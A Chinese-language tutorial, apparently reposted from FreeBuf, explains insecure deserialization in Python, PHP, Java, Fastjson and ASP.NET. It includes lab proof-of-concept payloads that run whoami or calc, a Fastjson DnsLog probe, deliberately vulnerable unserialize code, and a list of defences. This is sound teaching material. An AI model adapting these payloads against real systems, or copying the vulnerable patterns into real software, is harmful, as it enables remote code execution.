# 原文
[传送门](https://www.freebuf.com/articles/web/276624.html)

# 漏洞简介
序列化
- 把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程
- 例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式
反序列化
- 把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程
- 例如将二进制数据流或文件加载到内存中还原为对象

反序列化漏洞首次出现在2015，虽然漏洞较新，但利用十分热门，主要原因还是太过信任客户端提交的数据，容易被开发者忽略，该漏洞一般都可执行任意命令或代码，造成的影响较大
# 漏洞成因
在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码（如Shiro 1.2.4），使用不安全的反序列化框架库（如Fastjson 1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的
# 漏洞可能出现的位置
- 解析认证token、session的位置
- 将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等
- 将对象序列化后在网络中传输，如传输json数据，xml数据等
- 参数传递给程序
- 使用RMI协议，被广泛使用的RMI协议完全基于序列化
- 使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等
- 定义协议用来接收与发送原始的java对象
# 漏洞原理
在Python和PHP中，一般通过构造一个包含魔术方法（在发生特定事件或场景时被自动调用的函数，通常是构造函数或析构函数）的类，然后在魔术方法中调用命令执行或代码执行函数，接着实例化这个类的一个对象并将该对象序列化后传递给程序，当程序反序列化该对象时触发魔术方法从而执行命令或代码。在Java中没有魔术方法，但是有[反射（reflection）机制](https://xz.aliyun.com/t/7029/)：在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法，这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。一般利用反射机制来构造一个执行命令的对象或直接调用一个具有命令执行或代码执行功能的方法实现任意代码执行
## Python反序列化漏洞实验
以`pickle`模块为例，假设浏览器传递序列化后的`Cookie`给服务器保存，服务器经过一些处理后反序列化还原`Cookie`
```python
#!/usr/bin/python3
import pickle
# 客户端设置Cookie
set_cookie='abcdefasfsaafasf'
# 序列化后传递
cookie=pickle.dumps(set_cookie)
print("序列化：",cookie)
# ...
# 服务器接收到序列化后的Cookie
# 反序列化还原Cookie
new_cookie=pickle.loads(cookie)
print("反序列化：",new_cookie)
```
程序正常运行时，如图

![image](https://img-blog.csdnimg.cn/img_convert/f4af7846ab8959a3b5e471493592a77f.png)

利用`pickle`模块和魔术方法`__reduce__`生成执行命令的Payload
```python
#!/usr/bin/python3
import pickle
import os
 
# 定义一个执行命令的类
class exec:
    def __init__(self,cmd):
        self.cmd=cmd
    #  __reduce__()函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用，
    #  第二个元素是可调用对象的参数，pickle.loads会解决import问题，对于未引入的module会自动尝试import
    def __reduce__(self):
        return (os.system,(self.cmd,))
# 实例化对象
res=exec('whoami')
# 生成序列化数据
payload=pickle.dumps(res)
print("Payload:",payload)
```
生成执行`whoami`命令的Payload，如图

![image](https://img-blog.csdnimg.cn/img_convert/78292c5d00e35ff8d1f0410cb02e2c5c.png)

# PHP反序列化漏洞实验
PHP中通常使用`serialize`函数进行序列化，使用`unserialize`函数进行反序列化
### serialize函数输出格式
> NULL被序列化为：N

> Boolean型数据序列化为：b:1，b:0，分别代表True和False

> Integer型数据序列化为：i:数值

> String型数据序列化为：s:长度:"值"

> 对象序列化为：O:类名长度:类名:字段数:字段

输出的数字基本都是代表长度，在构造Payload时需要注意修改长度
## PHP中常用魔术方法
- __construct：当对象被创建时调用
- __destruct：当对象被销毁前调用
- __sleep：执行serialize函数前调用
- __wakeup：执行unserialize函数前调用
- __call：在对象中调用不可访问的方法时调用
- __callStatic：用静态方法调用不可访问方法时调用
- __get：获得类成因变量时调用
- __set：设置类成员变量时调用

使用下面代码创建一个类A并实例化一个对象a，然后输出序列化对象a后的值
```php
<?php
// 定义一个类
class A{
    var $test = "Hello";
    function __construct(){
    print "<h1>ABCD</h1>";
    }
}
 
// 实例化一个对象a
$a=new A();
// 序列化对象a
print "Serialize Object A: ".serialize($a)."<br/>";
?>
```
序列化对象a，如图

![image](https://img-blog.csdnimg.cn/img_convert/1ce7e515ae083e24c9ff2e97099dd1b6.png)

PHP中序列化后的数据中并没有像Python一样包含函数`__construct`和`print`的信息，而仅仅是类名和成员变量的信息。因此，在`unserialize`函数的参数可控的情况下，还需要代码中包含魔术方法才能利用反序列化漏洞

使用下面代码定义一个包含魔术方法`__destruct`的类A，然后实例化一个对象a并输出序列化后的数据，在对象销毁的时候程序会调用`system`函数执行`df`命令，然后通过GET方法传递参数`arg`的值给服务器进行反序列化
```php
<?php
 
// 定义一个类
class A{
    // 设置变量值为df
    var $test = "df";
    // 定义析构函数，在类A销毁时执行system("df")
    function __destruct(){
        print "Execute CMD: ".$this->test."<br/>";
        print "Result: ";
        system($this->test);
        print "<br/>";
    }
}
 
// 实例化一个对象a
$a=new A();
// 序列化对象a
print "Serialize Object A: ".serialize($a)."<br/>";
 
// GET方式获取参数arg的值
$arg = $_GET['arg'];
// 反序列化参数arg的值
$a_unser = unserialize($arg);
?>
```
不传入`arg`参数时，服务器返回对象a序列化后的数据和`df`命令执行的结果，如图

![image](https://img-blog.csdnimg.cn/img_convert/942a65975f7255c8ba840a79e31d5438.png)

当然，现实环境中几乎没有这样方便的攻击链，需要花不少时间去寻找POP链，可参考
[https://www.freebuf.com/column/203767.html](https://www.freebuf.com/column/203767.html)
[https://www.freebuf.com/column/203769.html](https://www.freebuf.com/column/203769.html)
## Java反序列化漏洞实验
Java中通常使用`Java.io.ObjectOutputStream`类中的`writeObject`方法进行序列化，`java.io.ObjectInputStream`类中的`readObject`方法进行反序列化。使用下面代码将字符串进行序列化和反序列化
```java
package com.company;
 
import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.io.FileOutputStream;
import java.io.FileInputStream;
 
 
public class Main{
 
    public static void main(String args[]) throws Exception {
        String obj = "hello";
 
        // 将序列化后的数据写入文件a.ser中，当序列化一个对象到文件时， 按照 Java 的标准约定是给文件一个 .ser 扩展名
        FileOutputStream fos = new FileOutputStream("a.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(obj);
        os.close();
 
        // 从文件a.ser中读取数据
        FileInputStream fis = new FileInputStream("a.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
 
        // 通过反序列化恢复字符串
        String obj2 = (String)ois.readObject();
        System.out.println(obj2);
        ois.close();
    }
}
```
程序执行后生成a.ser文件，如图

![image](https://img-blog.csdnimg.cn/img_convert/9aa743f7c8f0667ceea101719fb03dae.png)

以十六进制查看a.ser文件内容，如图 

![image](https://img-blog.csdnimg.cn/img_convert/4cdf142f75d120c4a35a648be81705ee.png)

Java序列化数据格式始终以双字节的十六进制`0xAC ED`作为开头，Base64编码之后为`rO0`。之后的两个字节是版本号，通常为`0x00 05`

一个Java类的对象要想序列化成功，必须满足两个条件
- 该类必须实现java.io.Serializable接口
- 该类的所有属性必须是可序列化的，如果有一个属性不是可序列化的，则该属性必须注明是短暂的

使用下面代码将对象序列化后存储到a.ser文件
```java
package com.company;
 
import java.io.ObjectOutputStream;
import java.io.FileOutputStream;
import java.io.Serializable;
import java.io.IOException;
 
// 定义一个实现 java.io.Serializable 接口的类Test
class Test implements Serializable {
    public String cmd="calc";
    // 重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        // 执行默认的readObject()方法
        in.defaultReadObject();
        // 执行打开计算器程序的命令
        Runtime.getRuntime().exec(cmd);
    }
}
 
public class Main{
 
    public static void main(String args[]) throws Exception{
        // 实例化对象test
        Test test = new Test();
 
        // 将对象test序列化后写入a.ser文件
        FileOutputStream fos = new FileOutputStream("a.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(test);
        os.close();
    }
}
```
执行程序后生成a.ser文件，以十六进制格式查看文件内容，如图

![image](https://img-blog.csdnimg.cn/img_convert/cace9564090dc9cc95be4a3b779b0e83.png)

最后5个字节分别为字符串长度和`calc`的ASCII值。因此，修改文件为下图所示，即`notepad`的ASCII值和长度 

![image](https://img-blog.csdnimg.cn/img_convert/8790be258cb140ba5d35846393d5a22c.png)

使用下面代码进行反序列化对象
```java
package com.company;
 
import java.io.ObjectInputStream;
import java.io.FileInputStream;
import java.io.Serializable;
import java.io.IOException;
 
// 定义一个实现 java.io.Serializable 接口的类Test
class Test implements Serializable {
    public String cmd="calc";
    // 重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        // 执行默认的readObject()方法
        in.defaultReadObject();
        // 执行打开计算器程序的命令
        Runtime.getRuntime().exec(cmd);
    }
}
 
public class Main{
 
    public static void main(String args[]) throws Exception{
        // 从a.ser文件中反序列化test对象
        FileInputStream fis = new FileInputStream("a.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Test objectFromDisk = (Test)ois.readObject();
        System.out.println(objectFromDisk.cmd);
        ois.close();
    }
}
```
程序执行后成功运行`notepad`，如图

![image](https://img-blog.csdnimg.cn/img_convert/cdb65b0024114e5d7ea9cba5ffa9eabb.png)

现实环境中也没有这样方便的攻击链，需要去寻找POP链，可参考
[https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/](https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/)
## FastJson反序列化漏洞简单实验
FastJson作为史上最快的Json解析库应用也十分广泛，在1.2.69版本以下，其`AutoType`特性在反序列化过程中会导致反序列化漏洞，这个特性就是：在对JSON字符串进行反序列化的时候，会读取`@type`参数指定的类，然后把JSON内容反序列化为此类的对象，并且会调用这个类的设置（setter）方法
### 实验环境
- 前端采用json提交用户名密码
- 后台使用fastjson 1.2.24版本
- 源码和WAR包[GitHub地址](https://github.com/NHPT/Java_Deserialization_Vulnerability_Experiment) 

创建一个`User`类，用于查看序列化数据格式，如图

![image](https://img-blog.csdnimg.cn/img_convert/e7833a4166612142fa8a7b0e36a229b6.png)

创建一个`home`类用于输出`user`对象的序列化数据，如图

![image](https://img-blog.csdnimg.cn/img_convert/94f2b469203ce4f05cce26448b672124.png)

创建一个`login`类用于获取前端页面提交的json格式用户名和密码数据，并使用`JSON.parseObject`方法进行反序列化解析json数据，在后台可看到提交的数据，如图 

![image](https://img-blog.csdnimg.cn/img_convert/664554aeba5da4809eec9b9a62db2d83.png)

访问`home`页面可直接获取`user`对象序列化后的结果，如图 

![image](https://img-blog.csdnimg.cn/img_convert/b616cc1e4df8fc7815bbc1675a03809c.png)

@type的值为对象所属的类，`user`和`passwd`分别为对象的用户名属性和密码属性。因此可以利用`AutoType`特性，构造一个使用`@type`参数指定一个攻击类库，包含类属性或方法的JSON字符串提交到服务器，在反序列化时调用这个类的方法达到执行代码的目的。通常使用`java.net.Inet4Address`类或`java.net.Inet6Address`类，通过`val`参数传递域名，利用DnsLog进行漏洞检测，即：`{"@type":"java.net.Inet4Address","val":"DnsLog"}`。在登录页面输入用户名和密码提交，拦截数据包，修改提交的Json数据，如图

![image](https://img-blog.csdnimg.cn/img_convert/0df6f52867098113cb7b339f89739a5c.png)

虽然服务器返回错误信息，但Payload仍然被成功执行，在DnsLog网站可以看到解析记录，如图

![image](https://img-blog.csdnimg.cn/img_convert/e62bb92e867153359d684e4e3dd382c3.png)

要执行命令需要构造新的POP链，常用的POP链
> 基于JNDI注入

> 基于ClassLoader

> 基于TemplatesImpl

由于本实验仅使用最小依赖编写，此处不再详细分析POP链，更多资料请查阅
[https://www.cnblogs.com/nice0e3/p/14776043.html](https://www.cnblogs.com/nice0e3/p/14776043.html)
[https://p0rz9.github.io/2019/05/12/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BTemplatesImpl%E8%B0%83%E7%94%A8%E9%93%BE/](https://p0rz9.github.io/2019/05/12/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BTemplatesImpl%E8%B0%83%E7%94%A8%E9%93%BE/)
## ASP.NET反序列化实验
 .NET框架包含多个序列化类，`BinaryFormatter`，`JavaScriptSerializer`，`XmlSerializer`，`DataContractSerializer`，本实验以XML序列化和反序列化为例
### 实验环境
- 采用Xml提交数据
- 使用.NET Framework 4.6.1
- 完整源码[GitHub地址](https://github.com/NHPT/ASP.NET-Deserialization-Vulnerability-Experiment)

使用下面代码定义一个`Test`类，包含执行`ipconfig`命令并返回执行结果的函数Run，使用`XmlSerializer`类将对象序列化后输出到页面 
```
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Xml.Serialization;
 
namespace ASP.NETStudy
{
    [Serializable]
    public class Test
    {
        public string _cmd = "ipconfig";
        public Test(string cmd)
        {
            _cmd = cmd;
        }
        public Test()
        {
        }
        public String Run()
        {
            Process p = new Process();
            // 设置要启动的应用程序
            p.StartInfo.FileName = "cmd.exe";
            // 不使用操作系统shell启动
            p.StartInfo.UseShellExecute = false;
            // 接受来自调用程序的输入信息
            p.StartInfo.RedirectStandardInput = true;
            // 输出信息
            p.StartInfo.RedirectStandardOutput = true;
            // 输出错误
            p.StartInfo.RedirectStandardError = true;
            // 不显示程序窗口
            p.StartInfo.CreateNoWindow = true;
            // 启动程序
            p.Start();
            // 向cmd窗口发送命令
            p.StandardInput.WriteLine(_cmd + "&exit");
            // 自动刷新
            p.StandardInput.AutoFlush = true;
            // 获取输出信息
            string strOuput = p.StandardOutput.ReadToEnd();
            //等待程序执行完退出进程
            p.WaitForExit();
            p.Close();
            // 返回执行结果
            return strOuput;
        }
    }
    public partial class _default : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            // 实例化对象 sc_Test
            Test sc_Test = new Test();
            // 创建字符串缓冲区buffer
            StringBuilder buffer = new StringBuilder();
            // 实例化序列号对象
            XmlSerializer serializer = new XmlSerializer(typeof(Test));
            // 序列化对象sc_Test并存储到buffer
            using (TextWriter writer = new StringWriter(buffer))
            {
                serializer.Serialize(writer, sc_Test);
            }
            String str = buffer.ToString();
            // 将xml数据HTML实体化，防止Windows安全检查拦截
            string r = string.Empty;
            for (int i = 0; i < str.Length; i++)
            {
                r += "&#" + Char.ConvertToUtf32(str, i) + ";";
            }
            // 输出到页面
            Response.Write("<center><h2>序列化数据</h2><textarea rows=\"10\" cols=\"100\" readonly align=\"center\">" + r+ "</textarea></center>");
 
        }
    }
}
```
使用下面代码将提交的XML数据反序列化，并执行对象的`Run`函数
```
using System;
using System.IO;
using System.Xml.Serialization;
 
namespace ASP.NETStudy
{
    public partial class info : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (Request.RequestType == "POST")
            {
                // 获取客户端提交的数据
                StreamReader s = new StreamReader(Request.InputStream);
                // 转换为String格式
                String ss = s.ReadToEnd();
                //Response.Write(ss);
                // 定义反序列化对象
                Test dsc_Test;
                XmlSerializer serializer = new XmlSerializer(typeof(Test));
                // 反序列化数据为dsc_Test对象
                using (TextReader reader = new StringReader(ss))
                {
                    Object obj = serializer.Deserialize(reader);
                    dsc_Test = (Test)obj;
                }
                // 调用对象的函数Run并返回执行结果到浏览器
                Response.Write(dsc_Test.Run());
            }
        }
    }
}
```
正常情况下访问页面，返回序列化后的数据，如图

![image](https://img-blog.csdnimg.cn/img_convert/19431b769084e34dd1c5f72b08276448.png)

点击`查看IP`按钮后，客户端提交数据，如图 

![image](https://img-blog.csdnimg.cn/img_convert/4d63ba0c942f7a5af18f97dfcf8eb88a.png)

服务器执行命令后返回到客户端，如图

![image](https://img-blog.csdnimg.cn/img_convert/ebf33377ae0f57d89ab5499fb6fa1c67.png)

如果攻击者将传输的XML数据进行篡改，如图 

![image](https://img-blog.csdnimg.cn/img_convert/1b5b7e741c4b687108959d706371645a.png)

服务器在反序列化后执行`whoami`命令，如图

![image](https://img-blog.csdnimg.cn/img_convert/f01c98229cb6d1f3ddba40f069f2c711.png)

## 防御方法
- 对反序列数据加密或签名，且加密密钥和签名密钥不要使用硬编码
- 对反序列化接口添加认证授权
- 设置反序列化服务仅在本地监听或者设置相应防火墙策略
- 禁止使用存在漏洞的第三方框架库
- 过滤、禁用危险函数
- 过滤T3协议或限定可连接的IP
- 设置Nginx反向代理，实现t3协议和http协议隔离
## 常用工具
[java](https://github.com/frohoff/ysoserial)
[php](https://github.com/ambionics/phpggc)
[.NET](https://github.com/pwntester/ysoserial.net)
